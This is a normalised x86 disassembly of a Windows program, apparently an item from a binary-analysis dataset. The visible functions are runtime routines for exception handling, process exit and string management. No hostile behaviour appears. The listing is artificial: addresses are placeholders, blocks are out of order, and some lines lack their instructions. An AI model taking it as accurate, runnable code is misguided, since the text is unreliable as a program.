jne r-xdata
retn
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403f90
call [ rw-data ]
sub_4034a8
push esi
mov si [ edx ]
or si si
je r-xdata
pop esi
mov ecx [ eax ]
jmp [ ecx - 0x10 ]
cmp si 0xc000
jae r-xdata
push eax
mov eax [ eax ]
call sub_403418
pop eax
je r-xdata
mov ecx esi
pop esi
jmp ecx
sub_4034d0
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x2
mov eax [ eax ]
jmp r-xdata
mov ch 0x0
mov cx [ esi ]
add esi ecx
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
mov eax [ esi + 0x2 ]
sub_403520
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
push eax
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x6
mov eax [ eax ]
mov esi [ eax - 0x38 ]
test esi esi
je r-xdata
pop edx
jmp r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
lea esi [ ecx + esi + 0x7 ]
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
mov cl [ esi + 0x6 ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov eax [ esi ]
pop edx
add eax edx
sub_403570
push edx
push ecx
push ebx
test dl dl
jl r-xdata
xor edx edx
lea ecx [ esp + 0x10 ]
mov ebx [ fs : edx ]
mov [ ecx ] ebx
mov [ ecx + 0x8 ] ebp
mov [ ecx + 0x4 ] sub_403599
mov [ ecx + 0xc ] eax
mov [ fs : edx ] ecx
pop ebx
pop ecx
pop edx
retn
call [ eax - 0xc ]
sub_403604
cmp [ rw-data ] 0x0
je r-xdata
retn
push eax
push eax
push edx
push esp
push 0x2
push 0x0
push 0xeedfae4
call [ rw-data ]
add esp 0x8
pop eax
sub_403640
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push [ ebx + 0x4 ]
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_403654
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push ebx
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_403668
test ecx ecx
je r-xdata
retn
mov eax [ ecx + 0x1 ]
cmp [ ecx ] 0xe9
je r-xdata
add ecx 0x5
cmp [ ecx ] 0xeb
jne r-xdata
movsx eax al
inc ecx
inc ecx
jmp r-xdata
add ecx eax
sub_403688
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push edx
push ecx
call sub_403668
push ecx
push esp
push 0x1
push 0x0
push 0xeedfae1
call [ rw-data ]
pop ecx
pop ecx
pop edx
pop eax
sub_4036ec
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
cld
call sub_403178
mov edx [ rw-data ]
test edx edx
je r-xdata
or [ eax + 0x4 ] 0x2
push ebx
xor ebx ebx
push esi
push edi
push ebp
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
mov edi [ esp + 0x28 ]
call sub_406118
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] r-xdata
add ebx 0x5
call sub_403654
jmp ebx
cmp [ rw-data ] 0x0
ja r-xdata
call edx
test eax eax
je r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0xeefface
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
call sub_403604
cmp [ rw-data ] 0x0
jbe r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
sub_403818
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax ]
cld
call sub_403178
mov edx [ rw-data ]
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
mov edi ebp
jmp r-xdata
call edx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
call [ rw-data ]
mov edx [ esp + 0x1c ]
call sub_403604
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x8 ]
push ebx
push esi
push edi
push ebp
mov ecx [ edx + 0x4 ]
mov ebx [ ecx + 0x5 ]
lea esi [ ecx + 0x9 ]
mov ebp eax
jmp r-xdata
xor ebx ebx
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
or [ eax + 0x4 ] 0x2
push esi
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
pop ebx
mov edi [ esp + 0x28 ]
call sub_406118
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] r-xdata
mov eax [ esp + 0x8 ]
call sub_403640
jmp [ ebx + 0x4 ]
cmp [ rw-data ] 0x0
ja r-xdata
mov edx eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
mov ecx [ eax - 0x28 ]
cmp ecx [ edi - 0x28 ]
jne r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edi [ edi - 0x24 ]
mov eax [ esi ]
test edi edi
jne r-xdata
mov eax [ eax - 0x2c ]
mov edx [ edi - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov edi [ edi ]
add esi 0x8
dec ebx
jne r-xdata
inc eax
inc edx
call sub_402be8
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_4039a0
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_403688
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub_4039d8
or eax eax
jne r-xdata
pop edx
push esp
push ebp
push edi
push esi
push ebx
push eax
push edx
push esp
push 0x7
push 0x1
push 0xeedfade
push edx
jmp [ rw-data ]
mov eax 0xd8
call sub_403f90
sub_403a00
mov eax [ esp + 0x30 ]
mov [ eax + 0x4 ] r-xdata
call sub_406118
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0xc ]
and [ eax + 0x4 ] 0xfffffffd
cmp [ eax ] 0xeedfade
je r-xdata
xor eax eax
add esp 0x14
mov edx [ fs : eax ]
pop ecx
mov edx [ edx ]
mov [ ecx ] edx
pop ebp
pop edi
pop esi
pop ebx
mov eax 0x1
retn
mov eax [ edx + 0x8 ]
call sub_40324c
call sub_4035e8
sub_403a54
call sub_406118
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0x8 ]
call sub_40324c
pop edx
mov esp [ esp + 0x2c ]
xor eax eax
pop ecx
mov [ fs : eax ] ecx
pop eax
pop ebp
call sub_4036b0
jmp edx
sub_403a9a
mov eax eax
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0xcf
jmp r-xdata
cmp eax 0xc000008e
jg r-xdata
mov al 0xca
jmp r-xdata
sub eax 0x3d
je r-xdata
mov al 0xda
jmp r-xdata
sub eax 0xc0000093
je r-xdata
and eax 0xff
mov edx [ edx + 0xc ]
call sub_4028b8
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd9
jmp r-xdata
jmp r-xdata
mov al 0xce
jmp r-xdata
dec eax
je r-xdata
je r-xdata
mov al 0xc8
jmp r-xdata
sub eax 0xc0000005
je r-xdata
mov al 0xff
mov al 0xc8
jmp r-xdata
dec eax
je r-xdata
mov al 0xcd
jmp r-xdata
jmp r-xdata
mov al 0xd8
jmp r-xdata
sub eax 0x87
je r-xdata
mov al 0xd7
jmp r-xdata
jmp r-xdata
mov al 0xc9
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_403bfc
xor edx edx
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov ecx [ fs : edx ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
mov [ fs : edx ] eax
retn
cmp [ ecx ] eax
jne r-xdata
mov ecx [ ecx ]
mov eax [ eax ]
mov [ ecx ] eax
sub_403c24
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ edi + 0xc ]
mov esi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403c6a
push [ fs : edx ]
mov [ fs : edx ] esp
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
mov [ edi + 0xc ] ebx
mov eax [ esi + ebx * 8 + 0x4 ]
test eax eax
je r-xdata
test ebx ebx
jg r-xdata
call eax
sub_403c84
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ eax ]
xor ebx ebx
mov edi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403cca
push [ fs : edx ]
mov [ fs : edx ] esp
cmp esi ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ edi + ebx * 8 ]
inc ebx
mov [ rw-data ] ebx
test eax eax
je r-xdata
cmp esi ebx
jg r-xdata
call eax
sub_403d24
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
add eax ebx
add edx ebx
call sub_405eac
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403d48
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add edx ebx
call sub_405eac
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403d70
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add eax [ esi + 0x8 ]
mov [ edx + ebx ] eax
add esi 0xc
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403d94
push ebx
push esi
push edi
mov esi rw-data
mov cl 0x10
mov ebx [ rw-data ]
mov eax ebx
mov edi 0xa
cdq
idiv edi
add dl 0x30
xor eax eax
mov al cl
mov [ esi + eax ] dl
mov eax ebx
mov ebx 0xa
cdq
idiv ebx
mov ebx eax
dec ecx
test ebx ebx
jne r-xdata
mov cl 0x1c
mov eax [ rw-data ]
mov edx eax
and edx 0xf
mov dl [ edx + rw-data ]
xor ebx ebx
mov bl cl
mov [ esi + ebx ] dl
shr eax 0x4
dec ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_403df0
xor eax eax
xchg [ rw-data ] eax
neg eax
sbb eax eax
inc eax
mov edi rw-data
mov ebx [ edi + 0x18 ]
mov ebp [ edi + 0x14 ]
push [ edi + 0x1c ]
push [ edi + 0x20 ]
mov esi [ edi ]
mov ecx 0xb
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0xc
sub_403e20
push ecx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0xd7b2
jne r-xdata
pop edx
retn
push 0x0
push rw-data
push rw-data
push 0x0
call sub_401324
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x1e
push rw-data
push 0xfffffff5
call sub_4012ec
push eax
call sub_40130c
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff5
call sub_4012ec
push eax
call sub_40130c
pop edx
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax rw-data
call [ rw-data ]
sub_403eac
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov esi rw-data
mov edi rw-data
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
call sub_403d94
call sub_403e20
xor eax eax
mov [ rw-data ] eax
mov edx [ edi ]
mov eax edx
xor edx edx
mov [ edi ] edx
mov ebp eax
call ebp
cmp [ edi ] 0x0
jne r-xdata
call sub_403c24
cmp [ ebx + 0x28 ] 0x1
jbe r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
call sub_403bfc
cmp [ ebx + 0x28 ] 0x1
jne r-xdata
call sub_40595c
mov edx [ ebx + 0x10 ]
mov eax [ edx + 0x10 ]
cmp eax [ edx + 0x4 ]
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
call [ ebx + 0x24 ]
test eax eax
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
call sub_403df0
push eax
call sub_40133c
mov eax [ ebx ]
push esi
mov esi eax
mov edi ebx
mov ecx 0xb
[ edi ] [ esi ]
pop esi
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esi ]
push eax
call ExitProcess
call [ rw-data ]
sub_403f9c
mov edx [ eax ]
test edx edx
je r-xdata
retn
mov [ eax ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
jne r-xdata
push eax
lea eax [ edx - 0x8 ]
call sub_4027d4
pop eax
sub_403fc0
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4027d4
sub_403ff0
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
call sub_404060
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
call sub_4029b0
pop edx
pop eax
jmp r-xdata
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4027d4
sub_404034
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4027d4
sub_404060
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax 0xa
and eax 0xfffffffe
push eax
call sub_4027b4
pop edx
mov [ edx + eax - 0x2 ] 0x0
add eax 0x8
pop edx
mov [ eax - 0x4 ] edx
mov [ eax - 0x8 ] 0x1
retn
sub_40408c
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
call sub_404060
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_403f9c
mov [ ebx ] edi
pop edi
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_4029b0
sub_4040bc
push ebp
mov ebp esp
push 0x0
push 0x0
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call WideCharToMultiByte
pop ebp
retn 0x4
sub_4040dc
push ebp
mov ebp esp
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call sub_40139c
pop ebp
retn 0x4
sub_4040f8
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_403f9c
jmp r-xdata
mov ebx ebp
add ebx ebx
mov eax edi
mov edx ebx
call sub_4045e8
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_4040bc
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0xfff
call sub_4040bc
mov ebx eax
test ebx ebx
jl r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_4045e8
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_40408c
jmp r-xdata
sub_404194
xor ecx ecx
test edx edx
je r-xdata
jmp sub_40408c
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_4041c4
xor ecx ecx
test edx edx
je r-xdata
jmp sub_4040f8
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_40420c
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_40408c
not ecx
sub_404238
push ebx
test edx edx
je r-xdata
mov [ eax ] 0x0
pop ebx
retn
mov ebx [ edx - 0x4 ]
test ebx ebx
je r-xdata
cmp ecx ebx
jl r-xdata
mov [ eax ] cl
inc eax
xchg edx eax
call sub_4029b0
pop ebx
retn
mov ecx ebx
sub_404264
test edx edx
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je sub_403ff0
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi [ ecx - 0x4 ]
mov edx [ esi - 0x4 ]
add edx edi
cmp esi ecx
je r-xdata
call sub_4045e8
mov eax [ ebx ]
mov ecx edi
jmp r-xdata
call sub_4045e8
mov eax esi
mov ecx [ esi - 0x4 ]
mov edx [ ebx ]
add edx edi
call sub_4029b0
pop edi
pop esi
pop ebx
retn
sub_4042a8
test edx edx
je r-xdata
mov edx ecx
jmp sub_403ff0
test ecx ecx
je sub_403ff0
cmp edx [ eax ]
je r-xdata
mov edx ecx
jmp sub_404264
cmp ecx [ eax ]
je r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push eax
mov eax [ ebx - 0x4 ]
add eax [ esi - 0x4 ]
call sub_404060
mov edi eax
mov edx eax
mov eax ebx
mov ecx [ ebx - 0x4 ]
call sub_4029b0
mov edx edi
mov eax esi
mov ecx [ esi - 0x4 ]
add edx [ ebx - 0x4 ]
call sub_4029b0
pop eax
mov edx edi
test edi edi
je r-xdata
push eax
push ecx
call sub_403ff0
pop edx
pop eax
jmp sub_404264
call sub_403ff0
pop edi
pop esi
pop ebx
retn
dec [ edi - 0x8 ]
sub_40431c
push ebx
push esi
push edi
push edx
push eax
mov ebx edx
xor edi edi
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ eax ] ecx
jne r-xdata
dec edx
jne r-xdata
add eax [ ecx - 0x4 ]
cmp edi ecx
jne r-xdata
mov edi ecx
mov eax [ ecx - 0x4 ]
dec edx
jmp r-xdata
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
test edi edi
je r-xdata
xor edi edi
call sub_404060
push eax
mov esi eax
mov edx eax
mov eax [ esp ]
mov esi [ edi - 0x4 ]
call sub_4045e8
mov edi [ esp ]
push [ edi ]
add esi [ edi ]
dec ebx
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ eax - 0x4 ]
add esi ecx
call sub_4029b0
mov eax [ esp + ebx * 4 + 0x18 ]
mov edx esi
test eax eax
je r-xdata
pop edx
pop eax
test edi edi
jne r-xdata
pop edx
pop edi
pop esi
pop ebx
pop eax
lea esp [ esp + edx * 4 ]
jmp eax
test edx edx
je r-xdata
call sub_403ff0
dec [ edx - 0x8 ]
sub_4043a8
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp cl bl
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
cmp ch bh
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
and ebx 0xff0000
and ecx 0xff0000
cmp ecx ebx
jne r-xdata
sub_404468
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
call sub_404060
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
push eax
mov ecx [ eax - 0x4 ]
call sub_4029b0
pop eax
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
jne r-xdata
lea eax [ eax - 0x8 ]
call sub_4027d4
sub_4044bc
push ebx
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
call sub_403f9c
mov ebx [ eax - 0x4 ]
test ebx ebx
je r-xdata
dec edx
jl r-xdata
xor edx edx
jmp r-xdata
cmp edx ebx
jge r-xdata
sub ebx edx
test ecx ecx
jl r-xdata
cmp ecx ebx
jg r-xdata
mov ecx ebx
jmp r-xdata
add edx eax
mov eax [ esp + 0x8 ]
call sub_40408c
jmp r-xdata
pop ebx
retn 0x4
sub_4044fc
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
call j_sub_404468#2
mov edx [ ebx ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ edx - 0x4 ]
dec esi
jl r-xdata
cmp esi ecx
jge r-xdata
test edi edi
jle r-xdata
sub ecx esi
cmp edi ecx
jle r-xdata
sub ecx edi
add edx esi
lea eax [ edi + edx ]
call sub_4029b0
mov edx [ ebx ]
mov eax ebx
mov edx [ edx - 0x4 ]
sub edx edi
call sub_4045e8
mov edi ecx
sub_404544
test eax eax
je r-xdata
retn
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov edx [ edx ]
push edx
test edx edx
je r-xdata
dec edi
jge r-xdata
mov edx [ edx - 0x4 ]
cmp edi edx
jle r-xdata
xor edi edi
mov ebp [ ebx - 0x4 ]
mov eax esi
add edx ebp
call sub_4045e8
pop eax
cmp eax ebx
jne r-xdata
mov edi edx
mov eax [ esi ]
lea edx [ edi + ebp ]
mov ecx [ eax - 0x4 ]
sub ecx edx
add edx eax
add eax edi
call sub_4029b0
mov eax ebx
mov edx [ esi ]
mov ecx ebp
add edx edi
call sub_4029b0
pop ebp
pop edi
pop esi
pop ebx
mov ebx [ esi ]
sub_4045a0
test eax eax
je r-xdata
retn
test edx edx
je r-xdata
xor eax eax
retn
push ebx
push esi
push edi
mov esi eax
mov edi edx
mov ecx [ edi - 0x4 ]
push edi
mov edx [ esi - 0x4 ]
dec edx
js r-xdata
pop edx
xor eax eax
jmp r-xdata
mov al [ esi ]
inc esi
sub ecx edx
jle r-xdata
pop edi
pop esi
pop ebx
[ edi ]
jne r-xdata
mov ebx ecx
push esi
push edi
mov ecx edx
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
pop edx
mov eax edi
sub eax edx
mov ecx ebx
jmp r-xdata
sub_4045e8
push ebx
push esi
push edi
mov ebx eax
mov esi edx
xor edi edi
test edx edx
jle r-xdata
mov eax ebx
call sub_403f9c
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
call sub_404060
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
sub eax 0x8
add edx 0x9
push eax
mov eax esp
call sub_4027f4
pop eax
add eax 0x8
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ esi + eax ] 0x0
jmp r-xdata
call sub_4029b0
mov ecx esi
pop edi
pop esi
pop ebx
retn
sub_40464c
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax ecx
call sub_403f9c
test esi esi
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_404060
mov [ edi ] eax
mov edx esi
mov cl bl
call sub_402c58
sub_4046c0
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
push eax
call sub_4013dc
mov eax [ ebx ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
sub_4046e4
test edx edx
je sub_4046a8
mov ecx [ edx - 0x4 ]
shr ecx 0x1
je sub_4046a8
push ecx
push edx
push eax
call SysReAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402910
retn
sub_404708
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_4046a8
jmp r-xdata
mov ebx ebp
mov eax edi
mov edx ebx
call sub_4048f0
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_4040dc
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0x7ff
call sub_4040dc
mov ebx eax
test ebx ebx
jle r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_4048f0
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_404794
jmp r-xdata
sub_404794
test ecx ecx
je sub_4046a8
push eax
push ecx
push edx
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402910
pop edx
push [ edx ]
mov [ edx ] eax
call sub_4013dc
retn
sub_4047b8
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404794
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
